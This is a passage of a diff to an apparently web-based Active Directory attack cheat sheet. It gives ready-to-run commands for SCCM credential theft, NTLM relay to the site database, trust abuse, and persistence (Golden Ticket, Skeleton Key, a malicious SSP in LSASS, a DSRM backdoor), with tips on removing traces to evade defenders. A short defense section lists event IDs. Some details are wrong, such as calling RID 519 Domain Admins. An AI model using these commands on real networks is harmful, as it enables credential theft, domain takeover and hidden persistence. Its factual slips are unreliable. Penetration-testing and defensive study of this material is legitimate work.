+          {label: 'Confirm from a normal domain enum pass', code: `<span class="cmd-str">nxc</span> smb <span class="var">10.10.10.10</span> -u jsmith -p P@ss -d corp.local --shares\n<span class="cmd-str">ldeep</span> ldap -u jsmith -p P@ss -d corp.local -s <span class="var">ldap://10.10.10.10</span> sccm`, explain: `Two quick checks once you already have valid creds: \`nxc smb --shares\` shows readable shares (SCCM often exposes package shares); \`ldeep ... sccm\` specifically flags SCCM-related objects/attributes found in LDAP.`}
+        ]
+      },
+      {
+        name: 'Creds-1 — No Credentials: PXE Boot Media',
+        badges: [{type:'network', label:'No Creds'}, {type:'creds', label:'Creds'}],
+        desc: 'If PXE boot is enabled without a boot password, or with a weak one, the boot media itself contains a crackable NAA-derived hash — recoverable before you have any domain access at all.',
+        examples: [
+          {label: 'Extract and crack the PXE hash', code: `<span class="comment"># Capture the PXE boot media response, then crack:</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">19850</span> pxe_hash.txt rockyou.txt`, explain: `Capture the response when a device does a network PXE boot (the media is often password-protected) then crack the extracted hash offline with hashcat mode \`19850\`, recovering the shared PXE boot password.`}
+        ]
+      },
+      {
+        name: 'Creds-2 — Policy Request Credentials (as a new computer)',
+        badges: [{type:'windows', label:'Simple User'}, {type:'creds', label:'Creds'}],
+        desc: 'A simple authenticated user can add a new computer object, register it as an SCCM client, and request policy — which hands back the Network Access Account (NAA) credentials in an obfuscated blob.',
+        examples: [
+          {label: 'Register as a new device and pull NAA creds', code: `<span class="cmd-str">sccmwtf.py</span> newcomputer newcomputer.corp.local <span class="var">10.10.10.10</span> <span class="str">'corp\\newcomputer$'</span> <span class="str">'ComputerPass123'</span>\n<span class="cmd-str">SharpSCCM.exe</span> get secrets -r newcomputer -u <span class="var">newcomputer$</span> -p <span class="var">ComputerPass123</span>`, explain: `\`newcomputer\` mode = registers a brand-new fake computer object with SCCM, impersonating a legitimate client enrollment; \`SharpSCCM.exe get secrets\` then pulls Network Access Account (NAA) credentials that get pushed down to any enrolling client.`},
+          {label: 'Deobfuscate the recovered policy secret', code: `<span class="cmd-str">policysecretunobfuscate.py</span> <span class="var">policy_blob.bin</span>`, explain: `SCCM sometimes obfuscates (not encrypts) policy secrets with a simple algorithm; this script reverses that obfuscation on the raw policy blob you captured, recovering the plaintext credential.`}
+        ],
+        notes: {type: 'tip', text: 'Clean up after yourself — delete the computer object you added once you have the NAA creds, or it sits there as an obvious IOC for the blue team.'}
+      },
+      {
+        name: 'Creds-3/4 — Computer Admin: Local NAA Secrets',
+        badges: [{type:'windows', label:'Computer Admin'}, {type:'creds', label:'Creds'}],
+        desc: 'If you already have local admin on a machine that has (or had) the SCCM client installed, the NAA and Client Push account credentials are recoverable straight from that host\'s WMI repository or disk cache — no relay or coercion needed.',
+        examples: [
+          {label: 'Pull secrets from WMI and disk', code: `<span class="cmd-str">SharpSCCM.exe</span> local secrets -m wmi\n<span class="cmd-str">SharpSCCM.exe</span> local secrets -m disk`, explain: `\`local secrets -m wmi\` / \`-m disk\` = two different local extraction methods for credentials cached by the SCCM client agent on the current host — one reads WMI, the other reads on-disk policy files.`},
+          {label: 'Same, via sccmhunter / dploot', code: `<span class="cmd-str">sccmhunter.py</span> dpapi -u jsmith -p P@ss -target <span class="var">10.10.10.10</span> -debug\n<span class="cmd-str">dploot.py</span> sccm -u jsmith -p P@ss <span class="var">10.10.10.10</span>`, explain: `Alternative to SharpSCCM: \`sccmhunter.py dpapi\` and \`dploot.py sccm\` both pull and DPAPI-decrypt SCCM client secrets remotely with domain creds, without needing local code execution first.`}
+        ]
+      },
+      {
+        name: 'Creds-5 — SCCM Admin: Site Database Credentials',
+        badges: [{type:'dc', label:'SCCM Admin'}, {type:'creds', label:'Creds'}],
+        desc: 'With SCCM admin rights, the Site DB (an MSSQL instance) holds every secret the site has ever collected, including local admin passwords via <code>SC_UserAccount</code>.',
+        examples: [
+          {label: 'Dump the Site DB directly', code: `<span class="cmd-str">secretsdump.py</span> corp.local/siteadmin:P@ss@<span class="var">sccm-db.corp.local</span>\n<span class="cmd-str">mssqlclient.py</span> -windows-auth -hashes <span class="var">HASH</span> <span class="str">'corp.local/sccm-server$'</span>@<span class="var">sccm-db.corp.local</span>`, explain: `\`secretsdump.py corp.local/siteadmin:pass@sccm-db\` = dumps the SCCM Site Database server directly if you hold Site Admin-equivalent creds; \`mssqlclient.py -hashes\` = alternative pass-the-hash connection straight to the underlying MSSQL instance.`},
+          {label: 'Query stored user accounts once connected', code: `<span class="cmd-str">SQL></span> use CM_<span class="var">SITECODE</span>;\n<span class="cmd-str">SQL></span> SELECT * FROM SC_UserAccount;\n<span class="comment"># Values are encrypted — decrypt with:</span>\n<span class="cmd-str">sccmdecryptpoc.exe</span> <span class="var">&lt;encrypted_value&gt;</span>`, explain: `\`use CM_SITECODE\` = switch to the SCCM site database; \`SELECT * FROM SC_UserAccount\` = pull all stored, encrypted service account credentials; \`sccmdecryptpoc.exe\` = decrypt the recovered blob into plaintext.`}
+        ]
+      },
+      {
+        name: 'Creds-6 — Loot from Distribution Points',
+        badges: [{type:'linux', label:'Python'}, {type:'creds', label:'Loot'}],
+        desc: 'Distribution Points expose deployed packages and policies over plain HTTP (80/443) and SMB (445). Both can be looted for embedded secrets without ever touching the site server itself.',
+        examples: [
+          {label: 'Loot files and policies over HTTP', code: `<span class="cmd-str">SCCMSecrets.py</span> files -dp <span class="var">http://10.10.10.20</span> -u jsmith -p P@ss\n<span class="cmd-str">SCCMSecrets.py</span> policies -mp <span class="var">http://10.10.10.10</span> -u <span class="var">'newcomputer$'</span> -p <span class="var">ComputerPass123</span> -cn newcomputer`, explain: `\`files -dp\` = loot arbitrary files hosted on a Distribution Point over HTTP with creds; \`policies -mp\` = pull client policy XML from a Management Point using a *device's own* machine credentials (\`newcomputer$\`), which often embed further secrets.`},
+          {label: 'Loot packages over SMB', code: `<span class="cmd-str">cmloot.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.20</span> -cmlootinventory sccmfiles.txt`, explain: `\`cmlootinventory\` = a pre-built list of interesting package files; the tool then pulls those specific files from the SCCM content library share over SMB using domain creds.`}
+        ]
+      },
+      {
+        name: 'Elevate-1 — Relay on Site Systems',
+        badges: [{type:'network', label:'Relay'}, {type:'windows', label:'Simple User'}],
+        desc: 'Coerce the site server itself to authenticate, and relay that authentication straight to another site system that lacks SMB signing — a direct path from simple user to Admin on a site system.',
+        examples: [
+          {label: 'Listen for the relay, then coerce', code: `<span class="cmd-str">ntlmrelayx.py</span> -tf <span class="var">site_systems.txt</span> -smb2support\n<span class="comment"># Trigger with any standard coercion (PetitPotam, printerbug, etc.)</span>`, explain: `\`-tf site_systems.txt\` = relay listener targeting a list of SCCM site system servers; then trigger any standard NTLM coercion (PetitPotam, printer bug) to force one of them to authenticate into the relay.`}
+        ]
+      },
+      {
+        name: 'Elevate-2 — Force Client Push Installation',
+        badges: [{type:'network', label:'Relay'}, {type:'windows', label:'Simple User'}],
+        desc: 'The Client Push Installation account authenticates with elevated (often SYSTEM-equivalent) rights when it installs the client on a new machine. Forcing a push at an attacker-controlled listener captures and relays that authentication.',
+        examples: [
+          {label: 'Listen, then force a client push install to yourself', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="var">sccm-server.corp.local</span> -smb2support -socks\n<span class="cmd-str">SharpSCCM.exe</span> invoke client-push -mp <span class="var">sccm-server.corp.local</span> -sc <span class="var">SITECODE</span> -t <span class="var">10.10.10.5</span>`, explain: `\`ntlmrelayx.py -socks\` = catch a coerced authentication and expose it as a SOCKS proxy session instead of using it immediately; \`SharpSCCM.exe invoke client-push -t\` = abuse SCCM's automatic client-push-install feature to force the *site server itself* to authenticate back to you (\`10.10.10.5\`), which the relay then catches.`},
+          {label: 'Use the captured session via SOCKS', code: `<span class="cmd-str">proxychains</span> smbexec.py -no-pass corp.local/<span class="var">socks_user</span>@<span class="var">sccm-server.corp.local</span>`, explain: `\`proxychains smbexec.py -no-pass\` = use the SOCKS session captured above (no separate password needed — auth is proxied live) to get a semi-interactive shell as the relayed account on the SCCM server.`}
+        ]
+      },
+      {
+        name: 'Elevate-3 — Automatic Client Push (unmanaged clients)',
+        badges: [{type:'network', label:'Relay'}, {type:'windows', label:'Simple User'}],
+        desc: 'If Automatic Site-Wide Client Push is enabled, SCCM periodically pushes the client to any new computer object it discovers in AD. Registering a fake computer and stripping its host SPN so it can\'t authenticate itself is enough to bait a client-push authentication your relay can catch.',
+        examples: [
+          {label: 'Add a DNS record for a fake host, then remove its host SPN', code: `<span class="cmd-str">dnstool.py</span> -u corp.local\\jsmith -p P@ss --record fakehost --action add --data <span class="var">10.10.10.5</span> <span class="var">10.10.10.10</span>\n<span class="cmd-str">setspn</span> -D host/fakehost.corp.local fakehost`, explain: `\`dnstool.py --record fakehost --action add\` = register a fake DNS A record pointing at your own IP; \`setspn -D\` = remove the auto-created SPN tied to that hostname so it doesn't collide with a real computer object — used to pose as a legitimate site system in some SCCM relay chains.`},
+          {label: 'Listen and wait for the automatic push (~5 min cycle)', code: `<span class="cmd-str">ntlmrelayx.py</span> -tf <span class="var">no_signing_targets.txt</span> -smb2support -socks`, explain: `\`-tf no_signing_targets.txt -socks\` = same relay listener setup, but this time just waiting passively for SCCM's automatic ~5-minute client check-in/push cycle to trigger authentication on its own, with no active coercion needed.`}
+        ]
+      },
+      {
+        name: 'Takeover-1/2 — Relay to the Site MSSQL Database',
+        badges: [{type:'network', label:'Relay'}, {type:'creds', label:'MSSQL'}],
+        desc: 'Once you can coerce authentication from the SCCM server or its MSSQL box, relaying it straight into the Site DB (which may live on a <em>different</em> host from the SCCM server itself) gives you SCCM admin without ever cracking a password.',
+        examples: [
+          {label: 'Coerce the Site DB itself and relay to MSSQL', code: `<span class="cmd-str">ntlmrelayx.py</span> -smb2support -ts -t <span class="var">mssql://sccm-db.corp.local</span> -q <span class="str">"INSERT INTO RBAC_Admins ..."</span>`, explain: `\`-ts\` = timestamp each relayed connection; \`-t mssql://sccm-db... -q\` = instead of just dumping data, relay straight into the Site DB's MSSQL instance and run a raw SQL insert that grants yourself SCCM administrative rights.`},
+          {label: 'Coerce the SCCM server, relay to a separate MSSQL box', code: `<span class="cmd-str">ntlmrelayx.py</span> -t <span class="var">mssql://sccm-db.corp.local</span> -smb2support -socks\n<span class="cmd-str">proxychains</span> smbexec.py -no-pass corp.local/<span class="str">'sccm-server$'</span>@<span class="var">10.10.10.20</span>`, explain: `Coerces the SCCM (site) server itself, but relays the resulting auth to a *different* MSSQL box; \`proxychains smbexec.py -no-pass\` then uses the relayed session against the original SCCM server via the SOCKS proxy.`},
+          {label: 'End-to-end automation (sccmhunter)', code: `<span class="cmd-str">sccmhunter.py</span> mssql -u jsmith -p P@ss -d corp.local -dc-ip <span class="var">10.10.10.10</span> -tu <span class="var">target_user</span> -sc <span class="var">SITECODE</span> -stacked`, explain: `One command that chains discovery, coercion, relay-to-MSSQL, and privilege grant together; \`-tu\` = the target user to escalate; \`-sc\` = SCCM site code; \`-stacked\` = run the whole attack sequence automatically.`}
+        ],
+        notes: {type: 'warning', text: 'The Site DB and the Site/Management server are frequently two different hosts — don\'t assume you need to touch the SCCM server itself once you can reach its database directly.'}
+      },
+      {
+        name: 'EXEC-1/2 — Lateral Movement as SCCM Admin',
+        badges: [{type:'dc', label:'SCCM Admin'}, {type:'cross', label:'Lateral'}],
+        desc: 'With confirmed SCCM admin rights, push arbitrary binaries or scripts to any managed device in the site — a built-in, "legitimate" remote execution channel that looks like normal deployment traffic.',
+        examples: [
+          {label: 'Authenticate as SCCM admin and execute on a device', code: `<span class="cmd-str">sccmhunter.py</span> admin -u jsmith@corp.local -p P@ss -ip <span class="var">10.10.10.10</span>\n<span class="cmd-str">SharpSCCM.exe</span> exec -p <span class="var">payload.exe</span> -d <span class="var">WORKSTATION01</span> -sc <span class="var">SITECODE</span> --no-banner`, explain: `\`admin -u/-p -ip\` = authenticate as an already-compromised SCCM admin account; \`SharpSCCM.exe exec -p payload.exe -d WORKSTATION01\` = push and execute a payload on a specific managed device through SCCM's own deployment mechanism.`}
+        ]
+      },
+      {
+        name: 'Post-Exploitation & Cleanup',
+        badges: [{type:'dc', label:'SCCM Admin'}, {type:'cross', label:'OPSEC'}],
+        desc: 'Map the collected devices and active user sessions for further targeting, then remove anything you added along the way — fake computer objects and RBAC grants are the two things most likely to get flagged in a post-incident review.',
+        examples: [
+          {label: 'Map devices with SCCMHound (BloodHound-compatible)', code: `<span class="cmd-str">SCCMHound.exe</span> --server <span class="var">sccm-server.corp.local</span> --sitecode <span class="var">SITECODE</span>`, explain: `\`--server\`/\`--sitecode\` = point the collector at the SCCM environment; produces a BloodHound-ingestible dataset mapping which users/devices have admin rights over which SCCM-managed machines — extending attack-path analysis beyond plain AD.`},
+          {label: 'List device sessions, then remove what you added', code: `<span class="cmd-str">SharpSCCM.exe</span> get devices -sms <span class="var">SMS_PROVIDER</span> -sc <span class="var">SITECODE</span> -p Name -p ResourceId\n<span class="cmd-str">SharpSCCM.exe</span> remove device GUID:<span class="var">&lt;GUID&gt;</span> -sms <span class="var">SMS_PROVIDER</span> -sc <span class="var">SITECODE</span>`, explain: `\`get devices\` = list all devices SCCM knows about along with active session/resource IDs; \`remove device GUID:<GUID>\` = clean-up step to delete a device object you added during testing (e.g. from example #118).`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'trusts',
+    title: 'Domain & Forest Trust Abuse',
+    icon: 'fa-link',
+    intro: 'Exploiting trust relationships between domains and forests. Compromising one domain often allows lateral movement or full takeover of trusted domains.',
+    items: [
+      {
+        name: 'External Trust Direction & Transitivity',
+        badges: [{type:'cross', label:'Trust'}, {type:'network', label:'Recon'}],
+        desc: 'Trust direction determines who can access whom: if <strong>A trusts B</strong>, users from B can access resources in A (not the reverse). A one-way trust with unconstrained delegation configured on the trusting side still lets an attacker on the trusted side coerce and capture a TGT. Two-way trusts combine both directions. Forest trusts add a transitivity flag (<code>FOREST_TRANSITIVE</code>, optionally narrowed by <code>TREAT_AS_EXTERNAL</code> or SID filtering/quarantining) that governs whether the trust extends beyond the two forest roots.',
+        examples: [
+          {label: 'Map all trusts and their direction/transitivity', code: `<span class="cmd-str">Get-DomainTrust</span> -Domain corp.local\n<span class="comment"># or, from BloodHound data:</span>\n<span class="cmd-str">MATCH</span> p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p`, explain: `\`Get-DomainTrust -Domain\` = list all trust relationships (direction, transitivity, type) for a domain via PowerView; the Cypher query does the same thing from already-collected BloodHound data instead of live querying AD.`},
+          {label: 'Check SID filtering / quarantine status', code: `<span class="cmd-str">nltest</span> /trusted_domains\n<span class="cmd-str">netdom</span> trust corp.local /domain:external.local /quarantine`, explain: `\`nltest /trusted_domains\` = list domains trusted by the current one; \`netdom trust ... /quarantine\` = check/set SID filtering (quarantine) on a trust, which blocks SID-History injection attacks across that trust if enabled.`}
+        ],
+        notes: {type: 'tip', text: 'Always confirm direction before planning an attack path — "DomainA trusts DomainB" means DomainB\'s users can hop <em>into</em> A, which is the opposite of what the naming often suggests at a glance.'}
+      },
+      {
+        name: 'Parent-Child Trust',
+        badges: [{type:'dc', label:'Trust'}, {type:'cross', label:'Forest'}],
+        desc: 'In a parent-child domain setup, Enterprise Admins (in the forest root) are automatically Domain Admins in all child domains via the <code>AdminSDHolder</code> and trust keys.',
+        examples: [
+          {label: 'Escalate from Child to Forest Root', code: `<span class="cmd-str">raiseChild.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.10</span>`, explain: `\`corp.local/jsmith:pass@10.10.10.10\` = credentials + child-domain DC; exploits the extra-trusted relationship between a child domain and its forest root to escalate straight from Domain Admin of the child to Enterprise Admin of the entire forest.`}
+        ]
+      },
+      {
+        name: 'SID History Injection',
+        badges: [{type:'dc', label:'Trust'}, {type:'creds', label:'Forge'}],
+        desc: 'If SID filtering is disabled on an external trust, an attacker can inject the SID of an Enterprise Admin into the SID History of a compromised account to gain forest root access.',
+        examples: [
+          {label: 'Forge ticket with SID History (Mimikatz)', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">kerberos::golden</span> /user:jsmith /domain:child.corp.local /sid:S-1-5-21-CHILD... /krbtgt:HASH /sids:S-1-5-21-ROOT-519 /ptt`, explain: `\`/sid\` = the **child** domain's SID; \`/krbtgt\` = the child domain's krbtgt hash; \`/sids\` = an *extra* SID injected into the ticket — the root domain's \`Domain Admins\` RID (519) — abusing SID History to make the forged ticket valid forest-wide.`}
+        ]
+      },
+      {
+        name: 'Trust Key Extraction',
+        badges: [{type:'dc', label:'Trust'}, {type:'creds', label:'Creds'}],
+        desc: 'Extract the inter-domain trust keys to forge cross-domain TGTs. Allows pivoting from one domain to another without needing the target domain\'s krbtgt hash.',
+        examples: [
+          {label: 'Extract trust keys', code: `<span class="cmd-str">secretsdump.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.10</span> | grep <span class="str">"trust"</span>`, explain: `Pulls all domain secrets via DCSync, then filters (\`grep "trust"\`) for the special inter-domain trust account keys, which are needed to forge cross-trust Golden/Inter-Realm tickets.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'persist',
+    title: 'Persistence',
+    icon: 'fa-anchor',
+    intro: 'Maintaining access after the initial foothold. The goal is to survive password resets, account lockouts, and partial cleanup.',
+    items: [
+      {
+        name: 'Golden Ticket / Golden Certificate',
+        badges: [{type:'dc', label:'DC'}, {type:'cross', label:'Forge'}],
+        desc: 'The ultimate persistence mechanisms. Golden Tickets use the krbtgt hash. Golden Certificates use the CA private key. Both allow indefinite impersonation.',
+        examples: [
+          {label: 'Forge Golden Ticket', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">kerberos::golden</span> /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt`, explain: `\`/sid\`/\`/domain\` = target domain identifiers; \`/krbtgt\` = the krbtgt account's NT hash (the master key for that domain's Kerberos); \`/user Administrator\` = forge a TGT claiming to be Administrator, valid until the krbtgt password is rotated twice; \`/ptt\` = inject it live.`}
+        ]
+      },
+      {
+        name: 'Skeleton Key / AdminSDHolder',
+        badges: [{type:'dc', label:'DC'}, {type:'cross', label:'AD'}],
+        desc: '<strong>Skeleton Key</strong> injects a universal password ("mimikatz") into LSASS on a DC. <strong>AdminSDHolder</strong> modifies the ACL template that propagates to all admin groups, granting persistent rights.',
+        examples: [
+          {label: 'Inject Skeleton Key', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">privilege::debug</span>\nmimikatz # <span class="cmd-str">misc::skeleton</span>`, explain: `\`misc::skeleton\` (after \`privilege::debug\`) = patches LSASS on a DC in memory so that a single master password now works for **every** domain account, in addition to their real passwords — resets on DC reboot.`}
+        ]
+      },
+      {
+        name: 'DCShadow / WMI Subscriptions',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'Windows'}],
+        desc: '<strong>DCShadow</strong> registers a rogue DC to push arbitrary AD changes. <strong>WMI Event Subscriptions</strong> provide local persistence by executing scripts on triggers.',
+        examples: [
+          {label: 'DCShadow rogue registration', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">lsadump::dcshadow</span> /object:jsmith /attribute:primarygroupid /value:512`, explain: `\`lsadump::dcshadow /object:jsmith /attribute:primarygroupid /value:512\` = temporarily registers your own machine as a fake Domain Controller and pushes a rogue AD change (here, making a user a member of Domain Admins) that replicates to real DCs without normal event logging.`}
+        ]
+      },
+      {
+        name: 'Custom SSP (Security Support Provider)',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'Windows'}],
+        desc: 'Registers mimikatz\'s <code>mimilib.dll</code> as a Security Support Provider. Every subsequent local and domain logon on that host — including DC logons — is logged in cleartext, no reboot required (loads it into LSASS live).',
+        examples: [
+          {label: 'Inject Custom SSP into LSASS (no reboot)', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">privilege::debug</span>\nmimikatz # <span class="cmd-str">misc::memssp</span>`, explain: `\`misc::memssp\` (after \`privilege::debug\`) = injects a malicious Security Support Provider into LSASS that logs every subsequent plaintext credential used to authenticate on that machine, without needing a reboot.`},
+          {label: 'Read the captured cleartext creds', code: `<span class="cmd-str">type</span> C:\\Windows\\System32\\kiwissp.log`, explain: `Reads the log file where the injected \`memssp\` (Skeleton Key/Custom SSP) writes every plaintext credential it captures — the actual payoff step after example #145.`}
+        ],
+        notes: {type: 'warning', text: 'The in-memory injection (<code>misc::memssp</code>) doesn\'t survive a reboot. For persistence across reboots, the SSP DLL must be dropped to disk and added to the <code>Security Packages</code> registry value under <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> — which is far noisier and easier to detect.'}
+      },
+      {
+        name: 'DSRM Backdoor',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'Windows'}],
+        desc: 'Every DC has a local <strong>Directory Services Restore Mode (DSRM)</strong> administrator account with its own password, normally only used for offline AD recovery. A registry change makes that local account usable for regular network logons — a credential that lives outside the domain account database entirely and survives krbtgt resets.',
+        examples: [
+          {label: 'Enable DSRM account for network logon', code: `<span class="cmd-str">New-ItemProperty</span> "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value <span class="flag">2</span> -PropertyType DWORD`, explain: `Sets a registry value enabling DSRM (Directory Services Restore Mode) account logon over the network; normally the DSRM local admin account can only log on locally, but this opens it up remotely.`},
+          {label: 'Sync DSRM password to a domain account\'s NTLM hash', code: `<span class="cmd-str">mimikatz</span> # <span class="cmd-str">lsadump::sam</span>\nmimikatz # <span class="cmd-str">lsadump::dcsync</span> /domain:corp.local /user:krbtgt`, explain: `\`lsadump::sam\` = read the local SAM (which includes the DSRM account) on a DC; \`lsadump::dcsync /user:krbtgt\` shown for contrast — the real DSRM persistence trick is syncing the DSRM account's password *to* a chosen domain account's hash so both can log in with it.`}
+        ],
+        notes: {type: 'tip', text: 'Value <code>2</code> allows the DSRM account to authenticate over the network at all times; <code>1</code> only allows it when the DC is booted into Directory Services Restore Mode.'}
+      },
+      {
+        name: 'Blunt Persistence (Group Membership / ACL Grants)',
+        badges: [{type:'dc', label:'DC'}, {type:'creds', label:'ACL'}],
+        desc: 'The least subtle options, kept for completeness: adding a controlled account straight to <strong>Domain Admins</strong>, or granting that account a standing ACE (e.g. <code>GenericAll</code> on the domain object, or DCSync rights) so you don\'t need a fresh privesc chain next time. Both are trivially visible to anyone reviewing group membership or DACLs, so treat them as a last resort, not a default.',
+        examples: [
+          {label: 'Add a user to Domain Admins', code: `<span class="cmd-str">net</span> group "domain admins" myuser /add /domain`, explain: `\`net group "domain admins" myuser /add /domain\` = the most direct privilege escalation: add a controlled account straight into Domain Admins (requires existing rights over that group).`},
+          {label: 'Grant standing DCSync rights via ACL (dacledit)', code: `<span class="cmd-str">dacledit.py</span> -action write -rights DCSync -principal myuser -target-dn <span class="var">"DC=corp,DC=local"</span> corp.local/jsmith:P@ss`, explain: `\`-action write -rights DCSync -principal myuser\` = instead of adding to a group, directly write a new ACE onto the domain root object granting \`myuser\` the two extended rights that together constitute DCSync — a stealthier, non-group-membership form of persistence.`}
+        ],
+        notes: {type: 'warning', text: 'Both of these show up in a routine BloodHound collection or a DACL audit — they buy convenience, not stealth.'}
+      }
+    ]
+  },
+  {
+    id: 'hashes',
+    title: 'Hash Cracking Reference',
+    icon: 'fa-terminal',
+    intro: 'Quick reference for mapping AD credential formats to their correct hashcat and John the Ripper cracking modes.',
+    items: [
+      {
+        name: 'Hashcat Modes',
+        badges: [{type:'cross', label:'Crack'}],
+        desc: 'Common hash formats extracted during AD assessments mapped to their hashcat mode (<code>-m</code>).',
+        examples: [
+          {label: 'NTLM / NTLMv1 / NTLMv2', code: `<span class="comment"># NT (Mode 1000)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">1000</span> nt.txt rockyou.txt\n<span class="comment"># NTLMv1 (Mode 5500 - net-NTLMv1)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">5500</span> ntlmv1.txt rockyou.txt\n<span class="comment"># NTLMv2 (Mode 5600 - from Responder)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">5600</span> ntlmv2.txt rockyou.txt`, explain: `\`-m 1000\` = plain NTLM hash cracking; \`-m 5500\` = NetNTLMv1 (weaker challenge-response, often relayable/crackable); \`-m 5600\` = NetNTLMv2 (what Responder captures) — each mode number tells hashcat which algorithm/format to expect.`},
+          {label: 'Kerberos AS-REP / TGS', code: `<span class="comment"># AS-REP etype 23/RC4 (Mode 18200)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">18200</span> asrep.txt rockyou.txt\n<span class="comment"># Kerberoast TGS RC4 (Mode 13100)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">13100</span> tgs.txt rockyou.txt\n<span class="comment"># Kerberoast TGS AES128/256 (Mode 19600 / 19700)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">19600</span> tgs_aes.txt rockyou.txt`, explain: `\`-m 18200\` = AS-REP roasted hashes (RC4/etype 23); \`-m 13100\` = Kerberoasted TGS with RC4 encryption; \`-m 19600\`/\`19700\` = Kerberoasted TGS using AES128/256 (slower to crack, but still crackable with a good wordlist).`},
+          {label: 'LM / MSCache2', code: `<span class="comment"># LM (Mode 3000)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">3000</span> lm.txt rockyou.txt\n<span class="comment"># Domain Cached Credentials v2 (Mode 2100)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">2100</span> mscache.txt rockyou.txt`, explain: `\`-m 3000\` = legacy LM hashes (very weak, case-insensitive, 7-char halves); \`-m 2100\` = Domain Cached Credentials v2, the hash format Windows stores locally for offline domain logon.`},
+          {label: 'Timeroast / PXE (no-creds hashes)', code: `<span class="comment"># Timeroast — MS-SNTP MAC (Mode 31300, needs hashcat 7.1.2+)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">31300</span> --username timeroast.txt rockyou.txt\n<span class="comment"># SCCM PXE boot media password ($sccm$aes128$..., Mode 19850)</span>\n<span class="cmd-str">hashcat</span> -m <span class="flag">19850</span> pxe.txt rockyou.txt`, explain: `\`-m 31300 --username\` = crack Timeroast-captured NTP MAC hashes (the \`--username\` flag is required since the format embeds it); \`-m 19850\` = crack SCCM PXE boot media passwords in their \`$sccm$aes128$...\` format.`},
+          {label: 'John the Ripper equivalents', code: `<span class="cmd-str">john</span> --format=nt hash.txt --wordlist=rockyou.txt\n<span class="cmd-str">john</span> --format=netntlmv2 hash.txt --wordlist=rockyou.txt\n<span class="cmd-str">john</span> --format=krb5tgs hash.txt --wordlist=rockyou.txt`, explain: `\`--format=nt\` = John's NTLM equivalent to hashcat mode 1000; \`--format=netntlmv2\` = equivalent to hashcat 5600; \`--format=krb5tgs\` = equivalent to Kerberoast/hashcat 13100 — same hash types, different tool syntax.`}
+        ],
+        notes: {type: 'warning', text: 'Corrected in this revision: Timeroast is hashcat mode <b>31300</b>, not 31100 — a typo in an earlier version of this reference would have sent you looking for the wrong mode entirely. Note it also requires a fairly recent hashcat build (7.1.2+).'}
+      }
+    ]
+  },
+  {
+    id: 'defend',
+    title: 'Defense & Detection',
+    icon: 'fa-shield-halved',
+    intro: 'A quick reference for defenders — event IDs, sensors, and Sigma rules that map to the techniques above.',
+    items: [
+      {
+        name: 'Key Windows Event IDs',
+        badges: [{type:'windows', label:'Windows'}],
+        desc: 'The events most useful for detecting AD attacks. Forward these to a SIEM and build alerts around them.',
+        examples: [
+          {label: 'Authentication events', code: `<span class="comment"># 4624 — successful logon (Logon Type matters: 3=network, 10=RDP, 2=interactive)</span>\n<span class="comment"># 4625 — failed logon (account lockouts, brute force)</span>\n<span class="comment"># 4648 — explicit credential logon (runas, scheduled tasks with stored creds)</span>\n<span class="comment"># 4672 — admin-equivalent logon (sensitive privileges assigned)</span>`, explain: `Key Windows Security log Event IDs for authentication: \`4624\` success (Logon Type 3=network, 10=RDP, 2=interactive, tells you *how* they logged in); \`4625\` failure (spot brute-force/spray attempts); \`4648\` explicit creds (runas, scheduled tasks); \`4672\` a sensitive/admin-equivalent logon just occurred.`},
+          {label: 'Kerberos events', code: `<span class="comment"># 4768 — TGT requested (look for AS-REP roasting: pre-auth failure with specific patterns)</span>\n<span class="comment"># 4769 — TGS requested (Kerberoasting: many TGS for SPN accounts in short time)</span>\n<span class="comment"># 4769 with ticket encryption 0x17 — RC4 downgrade, classic Kerberoast indicator</span>`, explain: `\`4768\` = TGT requested — check for repeated pre-auth failures, a sign of AS-REP roasting attempts; \`4769\` = TGS requested — many requests for different SPNs in a short window signals Kerberoasting; ticket encryption type \`0x17\` (RC4) on a \`4769\` is the classic downgrade indicator of a roasting attack.`},
+          {label: 'Object & service activity', code: `<span class="comment"># 4720 — user account created</span>\n<span class="comment"># 4732 — user added to global/local group</span>\n<span class="comment"># 5136 — directory service object modified (GPO, ACL, group changes)</span>\n<span class="comment"># 7045 — service installed (psexec, beacon service)</span>`, explain: `\`4720\` account created; \`4732\` member added to a group (watch for adds to privileged groups); \`5136\` a directory object was modified (GPOs, ACLs); \`7045\` a new service was installed — a very common footprint left by PsExec or C2 beacons for persistence/lateral movement.`}
+        ]
+      },
+      {
+        name: 'Honeypots & Canaries',
+        badges: [{type:'cross', label:'Detection'}],
+        desc: 'Fake objects (users, shares, SPNs) that should never be touched in normal operations. Any access = immediate detection.',
+        examples: [
